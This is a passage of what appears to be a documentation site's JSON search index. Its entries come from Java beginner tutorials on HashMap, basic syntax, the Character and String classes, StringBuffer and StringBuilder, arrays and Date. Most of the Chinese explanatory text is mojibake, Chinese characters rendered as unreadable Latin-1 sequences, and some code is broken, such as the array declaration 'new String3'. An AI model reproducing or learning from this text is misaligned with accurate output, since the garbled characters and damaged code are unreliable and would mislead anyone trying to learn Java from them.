myFriends.get(\u0026#34;Zenas\u0026#34;) ); Iterating over #  We can also access properties of a HashMap, such as the number of entries or the contents of the HashMap.\nLet\u0026rsquo;s access the length and print out the contents of the myFriends:\nHashMap\u0026lt;String, Integer\u0026gt; myFriends = new HashMap\u0026lt;String, Integer\u0026gt;();  myFriends.put(\u0026#34;Mark\u0026#34;, 24); myFriends.put(\u0026#34;Cassandra\u0026#34;, 25); myFriends.put(\u0026#34;Zenas\u0026#34;, 21);  System.out.println( myFriends.size() );  for (String name: myFriends.keySet()) {   System.out.println(name + \u0026#34; is age: \u0026#34; + myFriends.get(name));  } "},{"id":48,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/1.%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/","title":"1.åŸºç¡€è¯­æ³•","section":"èœé¸ŸåŸºç¡€æ•™ç¨‹","content":"åŸºç¡€è¯­æ³• #  åŸºæœ¬è¯­æ³• #  ç¼–å†™Javaç¨‹åºæ—¶ï¼Œåº”æ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š\n å¤§å°å†™æ•æ„Ÿï¼šJavaæ˜¯å¤§å°å†™æ•æ„Ÿçš„ï¼Œè¿™å°±æ„å‘³ç€æ ‡è¯†ç¬¦Helloä¸helloæ˜¯ä¸åŒçš„ã€‚ ç±»åï¼šå¯¹äºæ‰€æœ‰çš„ç±»æ¥è¯´ï¼Œç±»åçš„é¦–å­—æ¯åº”è¯¥å¤§å†™ã€‚å¦‚æœç±»åç”±è‹¥å¹²å•è¯ç»„æˆï¼Œé‚£ä¹ˆæ¯ä¸ªå•è¯çš„é¦–å­—æ¯åº”è¯¥å¤§å†™ï¼Œä¾‹å¦‚ MyFirstJavaClass ã€‚ æ–¹æ³•åï¼šæ‰€æœ‰çš„æ–¹æ³•åéƒ½åº”è¯¥ä»¥å°å†™å­—æ¯å¼€å¤´ã€‚å¦‚æœæ–¹æ³•åå«æœ‰è‹¥å¹²å•è¯ï¼Œåˆ™åé¢çš„æ¯ä¸ªå•è¯é¦–å­—æ¯å¤§å†™ã€‚ æºæ–‡ä»¶åï¼šæºæ–‡ä»¶åå¿…é¡»å’Œç±»åç›¸åŒã€‚å½“ä¿å­˜æ–‡ä»¶çš„æ—¶å€™ï¼Œä½ åº”è¯¥ä½¿ç”¨ç±»åä½œä¸ºæ–‡ä»¶åä¿å­˜ï¼ˆåˆ‡è®°Javaæ˜¯å¤§å°å†™æ•æ„Ÿçš„ï¼‰ï¼Œæ–‡ä»¶åçš„åç¼€ä¸º.javaã€‚ï¼ˆå¦‚æœæ–‡ä»¶åå’Œç±»åä¸ç›¸åŒåˆ™ä¼šå¯¼è‡´ç¼–è¯‘é”™è¯¯ï¼‰ã€‚ ä¸»æ–¹æ³•å…¥å£ï¼šæ‰€æœ‰çš„Java ç¨‹åºç”±**public static void main(String []args)**æ–¹æ³•å¼€å§‹æ‰§è¡Œã€‚  Javaæ ‡è¯†ç¬¦ #  Javaæ‰€æœ‰çš„ç»„æˆéƒ¨åˆ†éƒ½éœ€è¦åå­—ã€‚ç±»åã€å˜é‡åä»¥åŠæ–¹æ³•åéƒ½è¢«ç§°ä¸ºæ ‡è¯†ç¬¦ã€‚\nå…³äºJavaæ ‡è¯†ç¬¦ï¼Œæœ‰ä»¥ä¸‹å‡ ç‚¹éœ€è¦æ³¨æ„ï¼š\n æ‰€æœ‰çš„æ ‡è¯†ç¬¦éƒ½åº”è¯¥ä»¥å­—æ¯ï¼ˆA-Zæˆ–è€…a-zï¼‰,ç¾å…ƒç¬¦ï¼ˆ$ï¼‰ã€æˆ–è€…ä¸‹åˆ’çº¿ï¼ˆ_ï¼‰å¼€å§‹ é¦–å­—ç¬¦ä¹‹åå¯ä»¥æ˜¯å­—æ¯ï¼ˆA-Zæˆ–è€…a-zï¼‰,ç¾å…ƒç¬¦ï¼ˆ$ï¼‰ã€ä¸‹åˆ’çº¿ï¼ˆ_ï¼‰æˆ–æ•°å­—çš„ä»»ä½•å­—ç¬¦ç»„åˆ å…³é”®å­—ä¸èƒ½ç”¨ä½œæ ‡è¯†ç¬¦ æ ‡è¯†ç¬¦æ˜¯å¤§å°å†™æ•æ„Ÿçš„   Javaä¿®é¥°ç¬¦ #  åƒå…¶ä»–è¯­è¨€ä¸€æ ·ï¼ŒJavaå¯ä»¥ä½¿ç”¨ä¿®é¥°ç¬¦æ¥ä¿®é¥°ç±»ä¸­æ–¹æ³•å’Œå±æ€§ã€‚ä¸»è¦æœ‰ä¸¤ç±»ä¿®é¥°ç¬¦ï¼š\n è®¿é—®æ§åˆ¶ä¿®é¥°ç¬¦ : default, public , protected, private éè®¿é—®æ§åˆ¶ä¿®é¥°ç¬¦ : final, abstract, static, synchronized  åœ¨åé¢çš„ç« èŠ‚ä¸­æˆ‘ä»¬ä¼šæ·±å…¥è®¨è®ºJavaä¿®é¥°ç¬¦ã€‚\nJavaå˜é‡ #  Javaä¸­ä¸»è¦æœ‰å¦‚ä¸‹å‡ ç§ç±»å‹çš„å˜é‡\n å±€éƒ¨å˜é‡ ç±»å˜é‡ï¼ˆé™æ€å˜é‡ï¼‰ æˆå‘˜å˜é‡ï¼ˆéé™æ€å˜é‡ï¼‰  Javaæšä¸¾ #  Java 5.0å¼•å…¥äº†æšä¸¾ï¼Œæšä¸¾é™åˆ¶å˜é‡åªèƒ½æ˜¯é¢„å…ˆè®¾å®šå¥½çš„å€¼ã€‚ä½¿ç”¨æšä¸¾å¯ä»¥å‡å°‘ä»£ç ä¸­çš„bugã€‚\nä¾‹å¦‚ï¼Œæˆ‘ä»¬ä¸ºæœæ±åº—è®¾è®¡ä¸€ä¸ªç¨‹åºï¼Œå®ƒå°†é™åˆ¶æœæ±ä¸ºå°æ¯ã€ä¸­æ¯ã€å¤§æ¯ã€‚è¿™å°±æ„å‘³ç€å®ƒä¸å…è®¸é¡¾å®¢ç‚¹é™¤äº†è¿™ä¸‰ç§å°ºå¯¸å¤–çš„æœæ±ã€‚\nclass FreshJuice {  enum FreshJuiceSize{ SMALL, MEDIUM , LARGE };  FreshJuiceSize size; }  public class FreshJuiceTest {  public static void main(String []args){  FreshJuice juice = new FreshJuice();  juice.size = FreshJuice.FreshJuiceSize.MEDIUM ;  } } Java æºç¨‹åºä¸ç¼–è¯‘å‹è¿è¡ŒåŒºåˆ« #  "},{"id":49,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/10.character%E7%B1%BB/","title":"10. Characterç±»","section":"èœé¸ŸåŸºç¡€æ•™ç¨‹","content":"Character ç±» #  ä¾‹å¦‚ï¼Œå°†ä¸€ä¸ªcharç±»å‹çš„å‚æ•°ä¼ é€’ç»™éœ€è¦ä¸€ä¸ªCharacterç±»å‹å‚æ•°çš„æ–¹æ³•æ—¶ï¼Œé‚£ä¹ˆç¼–è¯‘å™¨ä¼šè‡ªåŠ¨åœ°å°†charç±»å‹å‚æ•°è½¬æ¢ä¸ºCharacterå¯¹è±¡ã€‚ è¿™ç§ç‰¹å¾ç§°ä¸ºè£…ç®±ï¼Œåè¿‡æ¥ç§°ä¸ºæ‹†ç®±ã€‚\n// åŸå§‹å­—ç¬¦ \u0026#39;a\u0026#39; è£…ç®±åˆ° Character å¯¹è±¡ ch ä¸­ Character ch = \u0026#39;a\u0026#39;;  // åŸå§‹å­—ç¬¦ \u0026#39;x\u0026#39; ç”¨ test æ–¹æ³•è£…ç®± // è¿”å›æ‹†ç®±çš„å€¼åˆ° \u0026#39;c\u0026#39; char c = test(\u0026#39;x\u0026#39;); ä¸‹é¢æ˜¯Characterç±»çš„æ–¹æ³•ï¼šhttp://www.runoob.com/java/java-character.html\n"},{"id":50,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/11.string%E7%B1%BB/","title":"11. Stringç±»","section":"èœé¸ŸåŸºç¡€æ•™ç¨‹","content":"String ç±» #  åˆ›å»ºå­—ç¬¦ä¸² #  String ç±»æœ‰ 11 ç§æ„é€ æ–¹æ³•ï¼Œè¿™äº›æ–¹æ³•æä¾›ä¸åŒçš„å‚æ•°æ¥åˆå§‹åŒ–å­—ç¬¦ä¸²ï¼Œåˆ›å»ºå­—ç¬¦ä¸²æœ€ç®€å•çš„æ–¹å¼å¦‚ä¸‹ï¼š\nString greeting = \u0026#34;èœé¸Ÿæ•™ç¨‹\u0026#34;; **æ³¨æ„:**String ç±»æ˜¯ä¸å¯æ”¹å˜çš„ï¼Œæ‰€ä»¥ä½ ä¸€æ—¦åˆ›å»ºäº† String å¯¹è±¡ï¼Œé‚£å®ƒçš„å€¼å°±æ— æ³•æ”¹å˜äº†ï¼ˆè¯¦çœ‹ç¬”è®°éƒ¨åˆ†è§£æï¼‰ã€‚\nå¦‚æœéœ€è¦å¯¹å­—ç¬¦ä¸²åšå¾ˆå¤šä¿®æ”¹ï¼Œé‚£ä¹ˆåº”è¯¥é€‰æ‹©ä½¿ç”¨ StringBuffer \u0026amp; StringBuilder ç±»ã€‚\nå­—ç¬¦ä¸²é•¿åº¦ #  String ç±»çš„ä¸€ä¸ªè®¿é—®å™¨æ–¹æ³•æ˜¯ length() æ–¹æ³•ï¼Œå®ƒè¿”å›å­—ç¬¦ä¸²å¯¹è±¡åŒ…å«çš„å­—ç¬¦æ•°ã€‚\nä¸€ä¸ªç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š\npublic class StringDemo {  public static void main(String args[]) {  String site = \u0026#34;www.runoob.com\u0026#34;;  int len = site.length();  System.out.println( \u0026#34;èœé¸Ÿæ•™ç¨‹ç½‘å€é•¿åº¦ : \u0026#34; + len );  } } è¿æ¥å­—ç¬¦ä¸² #  String ç±»æä¾›äº†è¿æ¥ä¸¤ä¸ªå­—ç¬¦ä¸²çš„æ–¹æ³•ï¼š\nstring1.concat(string2);\nè¿”å› string2 è¿æ¥ string1 çš„æ–°å­—ç¬¦ä¸²ã€‚ä¹Ÿå¯ä»¥å¯¹å­—ç¬¦ä¸²å¸¸é‡ä½¿ç”¨ concat() æ–¹æ³•ï¼Œå¦‚ï¼š\n\u0026#34;æˆ‘çš„åå­—æ˜¯ \u0026#34;.concat(\u0026#34;Runoob\u0026#34;); æ›´å¸¸ç”¨çš„æ˜¯ä½¿ç”¨ + æ“ä½œç¬¦æ¥è¿æ¥å­—ç¬¦ä¸²ï¼Œå¦‚ï¼š\n\u0026#34;Hello,\u0026#34; + \u0026#34; runoob\u0026#34; + \u0026#34;!\u0026#34; ç»“æœå¦‚ä¸‹:\n\u0026#34;Hello, runoob!\u0026#34; åˆ›å»ºæ ¼å¼åŒ–å­—ç¬¦ä¸² #  æˆ‘ä»¬çŸ¥é“è¾“å‡ºæ ¼å¼åŒ–æ•°å­—å¯ä»¥ä½¿ç”¨ printf() å’Œ format() æ–¹æ³•ã€‚\nString ç±»ä½¿ç”¨é™æ€æ–¹æ³• format() è¿”å›ä¸€ä¸ª String å¯¹è±¡è€Œä¸æ˜¯ PrintStream å¯¹è±¡ã€‚\nString ç±»çš„é™æ€æ–¹æ³• format() èƒ½ç”¨æ¥åˆ›å»ºå¯å¤ç”¨çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œè€Œä¸ä»…ä»…æ˜¯ç”¨äºä¸€æ¬¡æ‰“å°è¾“å‡ºã€‚\nå¦‚ä¸‹æ‰€ç¤ºï¼š\nSystem.out.printf(\u0026#34;æµ®ç‚¹å‹å˜é‡çš„å€¼ä¸º \u0026#34; +  \u0026#34;%f, æ•´å‹å˜é‡çš„å€¼ä¸º \u0026#34; +  \u0026#34; %d, å­—ç¬¦ä¸²å˜é‡çš„å€¼ä¸º \u0026#34; +  \u0026#34;is %s\u0026#34;, floatVar, intVar, stringVar); ä½ ä¹Ÿå¯ä»¥è¿™æ ·å†™\nString fs; fs = String.format(\u0026#34;æµ®ç‚¹å‹å˜é‡çš„å€¼ä¸º \u0026#34; +  \u0026#34;%f, æ•´å‹å˜é‡çš„å€¼ä¸º \u0026#34; +  \u0026#34; %d, å­—ç¬¦ä¸²å˜é‡çš„å€¼ä¸º \u0026#34; +  \u0026#34; %s\u0026#34;, floatVar, intVar, stringVar); ç±»æ–¹æ³• #  ä¸‹é¢æ˜¯ String ç±»æ”¯æŒçš„æ–¹æ³•ï¼Œæ›´å¤šè¯¦ç»†ï¼Œå‚çœ‹ Java String API æ–‡æ¡£ã€‚\n"},{"id":51,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/12.buffer%E4%B8%8Ebuilder/","title":"12. Bufferä¸ Builder","section":"èœé¸ŸåŸºç¡€æ•™ç¨‹","content":"StringBuffer å’Œ StringBuilder ç±» #  åŸºæœ¬ä»‹ç» #  å½“å¯¹å­—ç¬¦ä¸²è¿›è¡Œä¿®æ”¹çš„æ—¶å€™ï¼Œéœ€è¦ä½¿ç”¨ StringBuffer å’Œ StringBuilder ç±»ã€‚\nå’Œ String ç±»ä¸åŒçš„æ˜¯ï¼ŒStringBuffer å’Œ StringBuilder ç±»çš„å¯¹è±¡èƒ½å¤Ÿè¢«å¤šæ¬¡çš„ä¿®æ”¹ï¼Œå¹¶ä¸”ä¸äº§ç”Ÿæ–°çš„æœªä½¿ç”¨å¯¹è±¡ã€‚\nStringBuilder ç±»åœ¨ Java 5 ä¸­è¢«æå‡ºï¼Œå®ƒå’Œ StringBuffer ä¹‹é—´çš„æœ€å¤§ä¸åŒåœ¨äº StringBuilder çš„æ–¹æ³•ä¸æ˜¯çº¿ç¨‹å®‰å…¨çš„ï¼ˆä¸èƒ½åŒæ­¥è®¿é—®ï¼‰ã€‚\nç”±äº StringBuilder ç›¸è¾ƒäº StringBuffer æœ‰é€Ÿåº¦ä¼˜åŠ¿ï¼Œæ‰€ä»¥å¤šæ•°æƒ…å†µä¸‹å»ºè®®ä½¿ç”¨ StringBuilder ç±»ã€‚ç„¶è€Œåœ¨åº”ç”¨ç¨‹åºè¦æ±‚çº¿ç¨‹å®‰å…¨çš„æƒ…å†µä¸‹ï¼Œåˆ™å¿…é¡»ä½¿ç”¨ StringBuffer ç±»ã€‚\nä½¿ç”¨ç¤ºä¾‹ï¼š\npublic class Test{  public static void main(String args[]){  StringBuffer sBuffer = new StringBuffer(\u0026#34;èœé¸Ÿæ•™ç¨‹å®˜ç½‘ï¼š\u0026#34;);  sBuffer.append(\u0026#34;www\u0026#34;);  sBuffer.append(\u0026#34;.runoob\u0026#34;);  sBuffer.append(\u0026#34;.com\u0026#34;);  System.out.println(sBuffer);  } } æ–¹æ³•ï¼šhttp://www.runoob.com/java/java-stringbuffer.html\næ·±å…¥ç†è§£ #   https://zhuanlan.zhihu.com/p/62780312\n Java æä¾›çš„ä¸‰ç§æ“ä½œå­—ç¬¦ä¸²å¯¹è±¡çš„æ–¹æ³•ï¼šStringã€StringBufferã€StringBuilderã€‚å®ƒä»¬çš„ç›¸åŒç‚¹éƒ½æ˜¯ç”¨æ¥å°è£…å­—ç¬¦ä¸²ï¼Œéƒ½å®ç°äº† CharSequence æ¥å£ã€‚åŒºåˆ«å¦‚ä¸‹ï¼š\n  å…³äºå¯å˜æ€§ï¼š\n String æ˜¯ä¸€ä¸ªä¸å¯å˜ç±»ï¼Œåˆ›å»ºä¹‹åç›´åˆ°é”€æ¯ï¼Œè¿™ä¸ªå¯¹è±¡éƒ½æ˜¯ä¸å¯è¢«æ”¹å˜çš„ï¼› StringBufferã€StringBuilder éƒ½ç»§æ‰¿è‡ª AbstractStringBuilderï¼Œå®ƒçš„åº•å±‚ä½¿ç”¨å­—ç¬¦æ•°ç»„ä¿å­˜å­—ç¬¦ä¸²ï¼Œæ˜¯ä¸€ä¸ªå¯å˜ç±»ã€‚    å…³äºåˆå§‹åŒ–æ–¹æ³•ï¼š\n String ç±»å¯ä»¥ä½¿ç”¨ç›´æ¥èµ‹å€¼çš„æ–¹æ³•è¿›è¡Œåˆå§‹åŒ–ï¼šString s = \u0026quot;Hello\u0026quot;;ï¼› StringBufferã€StringBuilder åªèƒ½ä½¿ç”¨ new çš„è¿™ç§æ„é€ æ–¹æ³•èµ‹å€¼ã€‚    å…³äºä¿®æ”¹ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œä»¥å­—ç¬¦ä¸²è¿½åŠ ä¸ºä¾‹ï¼š\n  String å¯ä»¥ç›´æ¥ä½¿ç”¨ç´¯åŠ çš„æ–¹æ³•ï¼š\nString str = \u0026#34;Hello,\u0026#34;; str += \u0026#34;World\u0026#34;; è¿™ç§æ–¹æ³•çœ‹èµ·æ¥å¾ˆæ–¹ä¾¿ï¼Œå®é™…ä¸Šåº•å±‚æ˜¯é”€æ¯äº†åŸæ¥çš„å¯¹è±¡ååˆ›å»ºäº†ä¸€ä¸ªæ–°çš„å¯¹è±¡ï¼›\n  StringBufferã€StringBuilder ç­‰ä»·äºä½¿ç”¨ä¸‹é¢çš„ä»£ç ï¼š\nStringBuffer sb = new StringBuffer(\u0026#34;Hello,\u0026#34;); sb.append(\u0026#34;World\u0026#34;); å› ä¸ºå‰è€…çš„åº•å±‚ä¼šè¿›è¡Œä¸€äº›é¢å¤–çš„æ“ä½œï¼Œæ‰€ä»¥å³ä½¿å°† sb é‡æ–°å¤åˆ¶ç»™ Stringï¼Œæ•ˆç‡ä¹Ÿæ›´é«˜ã€‚\n    å…³äºä¸€äº›åŸç”Ÿçš„æ–¹æ³•ï¼š\n  String å®ç°äº† equals() æ–¹æ³•ä¸ hashCode() æ–¹æ³•ï¼›\n  StringBufferã€StringBuilder å¹¶æ²¡æœ‰å®ç°è¿™ä¸¤ä¸ªæ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼š\nStringBuffer sb1 = new StringBuffer(\u0026#34;Java\u0026#34;); StringBuffer sb2 = new StringBuffer(\u0026#34;Java\u0026#34;); sb1.equals(sb2); // ==\u0026gt; false     å…³äºæ˜¯å¦çº¿ç¨‹å®‰å…¨ï¼š\n StringBufferã€StringBuilder å®ƒä»¬éƒ½æä¾›äº†ä¸€ç³»åˆ—æ’å…¥è¿½åŠ æ”¹å˜å­—ç¬¦ä¸²åºåˆ—çš„æ–¹æ³•ï¼Œå®ƒä»¬çš„ç”¨æ³•åŸºæœ¬ç›¸åŒã€‚åŒºåˆ«åœ¨äº StringBuffer æ˜¯çº¿ç¨‹å®‰å…¨çš„ï¼Œè€Œ StringBuilder æ˜¯çº¿ç¨‹ä¸å®‰å…¨çš„ã€‚    "},{"id":52,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/13.%E6%95%B0%E7%BB%84/","title":"13.æ•°ç»„","section":"èœé¸ŸåŸºç¡€æ•™ç¨‹","content":"æ•°ç»„ #  å£°æ˜æ•°ç»„å˜é‡ #  é¦–å…ˆå¿…é¡»å£°æ˜æ•°ç»„å˜é‡ï¼Œæ‰èƒ½åœ¨ç¨‹åºä¸­ä½¿ç”¨æ•°ç»„ã€‚ä¸‹é¢æ˜¯å£°æ˜æ•°ç»„å˜é‡çš„è¯­æ³•ï¼š\ndataType[] arrayRefVar; // é¦–é€‰çš„æ–¹æ³•  æˆ–  dataType arrayRefVar[]; // æ•ˆæœç›¸åŒï¼Œä½†ä¸æ˜¯é¦–é€‰æ–¹æ³• æ³¨æ„: å»ºè®®ä½¿ç”¨ dataType[] arrayRefVar çš„å£°æ˜é£æ ¼å£°æ˜æ•°ç»„å˜é‡ã€‚ dataType arrayRefVar[] é£æ ¼æ˜¯æ¥è‡ª C/C++ è¯­è¨€ ï¼Œåœ¨ Java ä¸­é‡‡ç”¨æ˜¯ä¸ºäº†è®© C/C++ ç¨‹åºå‘˜èƒ½å¤Ÿå¿«é€Ÿç†è§£ Java è¯­è¨€ã€‚\nåˆ›å»ºæ•°ç»„ #  Java è¯­è¨€ä½¿ç”¨ new æ“ä½œç¬¦æ¥åˆ›å»ºæ•°ç»„ï¼Œè¯­æ³•å¦‚ä¸‹ï¼š\narrayRefVar = new dataType[arraySize]; ä¸Šé¢çš„è¯­æ³•è¯­å¥åšäº†ä¸¤ä»¶äº‹ï¼š\n  ä½¿ç”¨ dataType[arraySize] åˆ›å»ºäº†ä¸€ä¸ªæ•°ç»„ã€‚\n  æŠŠæ–°åˆ›å»ºçš„æ•°ç»„çš„å¼•ç”¨èµ‹å€¼ç»™å˜é‡ arrayRefVarã€‚\n  æ•°ç»„å˜é‡çš„å£°æ˜ï¼Œå’Œåˆ›å»ºæ•°ç»„å¯ä»¥ç”¨ä¸€æ¡è¯­å¥å®Œæˆï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š\ndataType[] arrayRefVar = new dataType[arraySize]; å¦å¤–ï¼Œä½ è¿˜å¯ä»¥ä½¿ç”¨å¦‚ä¸‹çš„æ–¹å¼åˆ›å»ºæ•°ç»„ï¼š\ndataType[] arrayRefVar = {value0, value1, ..., valuek}; æ•°ç»„ä½œä¸ºå‡½æ•°çš„å‚æ•° #  å¯ä»¥\næ•°ç»„ä½œä¸ºå‡½æ•°çš„è¿”å›å€¼ #  å¯ä»¥\nå¤šç»´æ•°ç»„ #  å¤šç»´æ•°ç»„å¯ä»¥çœ‹æˆæ˜¯æ•°ç»„çš„æ•°ç»„ï¼Œæ¯”å¦‚äºŒç»´æ•°ç»„å°±æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„ä¸€ç»´æ•°ç»„ï¼Œå…¶æ¯ä¸€ä¸ªå…ƒç´ éƒ½æ˜¯ä¸€ä¸ªä¸€ç»´æ•°ç»„ï¼Œä¾‹å¦‚ï¼š\nString str = new String3; Arrays ç±» #  java.util.Arrays ç±»èƒ½æ–¹ä¾¿åœ°æ“ä½œæ•°ç»„ï¼Œå®ƒæä¾›çš„æ‰€æœ‰æ–¹æ³•éƒ½æ˜¯é™æ€çš„ã€‚\nå…·æœ‰ä»¥ä¸‹åŠŸèƒ½ï¼š\n ç»™æ•°ç»„èµ‹å€¼ï¼šé€šè¿‡ fill æ–¹æ³•ã€‚ å¯¹æ•°ç»„æ’åºï¼šé€šè¿‡ sort æ–¹æ³•,æŒ‰å‡åºã€‚ æ¯”è¾ƒæ•°ç»„ï¼šé€šè¿‡ equals æ–¹æ³•æ¯”è¾ƒæ•°ç»„ä¸­å…ƒç´ å€¼æ˜¯å¦ç›¸ç­‰ã€‚ æŸ¥æ‰¾æ•°ç»„å…ƒç´ ï¼šé€šè¿‡ binarySearch æ–¹æ³•èƒ½å¯¹æ’åºå¥½çš„æ•°ç»„è¿›è¡ŒäºŒåˆ†æŸ¥æ‰¾æ³•æ“ä½œã€‚  å…·ä½“è¯´æ˜è¯·æŸ¥çœ‹ä¸‹è¡¨ï¼š\n   åºå· æ–¹æ³•å’Œè¯´æ˜     1 public static int binarySearch(Object[] a, Object key) ç”¨äºŒåˆ†æŸ¥æ‰¾ç®—æ³•åœ¨ç»™å®šæ•°ç»„ä¸­æœç´¢ç»™å®šå€¼çš„å¯¹è±¡(Byte,Int,doubleç­‰)ã€‚æ•°ç»„åœ¨è°ƒç”¨å‰å¿…é¡»æ’åºå¥½çš„ã€‚å¦‚æœæŸ¥æ‰¾å€¼åŒ…å«åœ¨æ•°ç»„ä¸­ï¼Œåˆ™è¿”å›æœç´¢é”®çš„ç´¢å¼•ï¼›å¦åˆ™è¿”å› (-(æ’å…¥ç‚¹) - 1)ã€‚   2 public static boolean equals(long[] a, long[] a2) å¦‚æœä¸¤ä¸ªæŒ‡å®šçš„ long å‹æ•°ç»„å½¼æ­¤ç›¸ç­‰ï¼Œåˆ™è¿”å› trueã€‚å¦‚æœä¸¤ä¸ªæ•°ç»„åŒ…å«ç›¸åŒæ•°é‡çš„å…ƒç´ ï¼Œå¹¶ä¸”ä¸¤ä¸ªæ•°ç»„ä¸­çš„æ‰€æœ‰ç›¸åº”å…ƒç´ å¯¹éƒ½æ˜¯ç›¸ç­‰çš„ï¼Œåˆ™è®¤ä¸ºè¿™ä¸¤ä¸ªæ•°ç»„æ˜¯ç›¸ç­‰çš„ã€‚æ¢å¥è¯è¯´ï¼Œå¦‚æœä¸¤ä¸ªæ•°ç»„ä»¥ç›¸åŒé¡ºåºåŒ…å«ç›¸åŒçš„å…ƒç´ ï¼Œåˆ™ä¸¤ä¸ªæ•°ç»„æ˜¯ç›¸ç­‰çš„ã€‚åŒæ ·çš„æ–¹æ³•é€‚ç”¨äºæ‰€æœ‰çš„å…¶ä»–åŸºæœ¬æ•°æ®ç±»å‹ï¼ˆByteï¼Œshortï¼ŒIntç­‰ï¼‰ã€‚   3 public static void fill(int[] a, int val) å°†æŒ‡å®šçš„ int å€¼åˆ†é…ç»™æŒ‡å®š int å‹æ•°ç»„æŒ‡å®šèŒƒå›´ä¸­çš„æ¯ä¸ªå…ƒç´ ã€‚åŒæ ·çš„æ–¹æ³•é€‚ç”¨äºæ‰€æœ‰çš„å…¶ä»–åŸºæœ¬æ•°æ®ç±»å‹ï¼ˆByteï¼Œshortï¼ŒIntç­‰ï¼‰ã€‚   4 public static void sort(Object[] a) å¯¹æŒ‡å®šå¯¹è±¡æ•°ç»„æ ¹æ®å…¶å…ƒç´ çš„è‡ªç„¶é¡ºåºè¿›è¡Œå‡åºæ’åˆ—ã€‚åŒæ ·çš„æ–¹æ³•é€‚ç”¨äºæ‰€æœ‰çš„å…¶ä»–åŸºæœ¬æ•°æ®ç±»å‹ï¼ˆByteï¼Œshortï¼ŒIntç­‰ï¼‰ã€‚    "},{"id":53,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/14.%E6%97%A5%E6%9C%9F%E5%92%8C%E6%97%B6%E9%97%B4/","title":"14.æ—¥æœŸå’Œæ—¶é—´","section":"èœé¸ŸåŸºç¡€æ•™ç¨‹","content":"æ—¥æœŸå’Œæ—¶é—´ #  Date #  java.util åŒ…æä¾›äº† Date ç±»æ¥å°è£…å½“å‰çš„æ—¥æœŸå’Œæ—¶é—´ã€‚ Date ç±»æä¾›ä¸¤ä¸ªæ„é€ å‡½æ•°æ¥å®ä¾‹åŒ– Date å¯¹è±¡ã€‚\nç¬¬ä¸€ä¸ªæ„é€ å‡½æ•°ä½¿ç”¨å½“å‰æ—¥æœŸå’Œæ—¶é—´æ¥åˆå§‹åŒ–å¯¹è±¡ã€‚\nDate(); ç¬¬äºŒä¸ªæ„é€ å‡½æ•°æ¥æ”¶ä¸€ä¸ªå‚æ•°ï¼Œè¯¥å‚æ•°æ˜¯ä»1970å¹´1æœˆ1æ—¥èµ·çš„æ¯«ç§’æ•°ã€‚\nDate(long millisec); Date å¯¹è±¡åˆ›å»ºä»¥åï¼Œå¯ä»¥è°ƒç”¨ä¸‹é¢çš„æ–¹æ³•ï¼šhttp://www.runoob.com/java/java-date-time.html\nè·å–å½“å‰æ—¥æœŸæ—¶é—´ #  Java ä¸­è·å–å½“å‰æ—¥æœŸå’Œæ—¶é—´å¾ˆç®€å•ï¼Œä½¿ç”¨ Date å¯¹è±¡çš„ toString() æ–¹æ³•æ¥æ‰“å°å½“å‰æ—¥æœŸå’Œæ—¶é—´ï¼š\nimport java.util.Date;  public class DateDemo {  public static void main(String args[]) {  // åˆå§‹åŒ– Date å¯¹è±¡  Date date = new Date();   // ä½¿ç”¨ toString() å‡½æ•°æ˜¾ç¤ºæ—¥æœŸæ—¶é—´  System.out.println(date.toString());  } } æ—¥æœŸæ¯”è¾ƒ #  Java ä½¿ç”¨ä»¥ä¸‹ä¸‰ç§æ–¹æ³•æ¥æ¯”è¾ƒä¸¤ä¸ªæ—¥æœŸï¼š\n ä½¿ç”¨ getTime() æ–¹æ³•è·å–ä¸¤ä¸ªæ—¥æœŸï¼ˆè‡ª1970å¹´1æœˆ1æ—¥ç»å†çš„æ¯«ç§’æ•°å€¼ï¼‰ï¼Œç„¶åæ¯”è¾ƒè¿™ä¸¤ä¸ªå€¼ã€‚ ä½¿ç”¨æ–¹æ³• before()ï¼Œafter() å’Œ equals()ã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ªæœˆçš„12å·æ¯”18å·æ—©ï¼Œåˆ™ new Date(99, 2, 12).before(new Date (99, 2, 18)) è¿”å› trueã€‚ ä½¿ç”¨ compareTo() æ–¹æ³•ï¼Œå®ƒæ˜¯ç”± Comparable æ¥å£å®šä¹‰çš„ï¼ŒDate ç±»å®ç°äº†è¿™ä¸ªæ¥å£ã€‚  ä½¿ç”¨ SimpleDateFormat æ ¼å¼åŒ–æ—¥æœŸ #  SimpleDateFormat æ˜¯ä¸€ä¸ªä»¥è¯­è¨€ç¯å¢ƒæ•æ„Ÿçš„æ–¹å¼æ¥æ ¼å¼åŒ–å’Œåˆ†ææ—¥æœŸçš„ç±»ã€‚SimpleDateFormat å…è®¸ä½ é€‰æ‹©ä»»ä½•ç”¨æˆ·è‡ªå®šä¹‰æ—¥æœŸæ—¶é—´æ 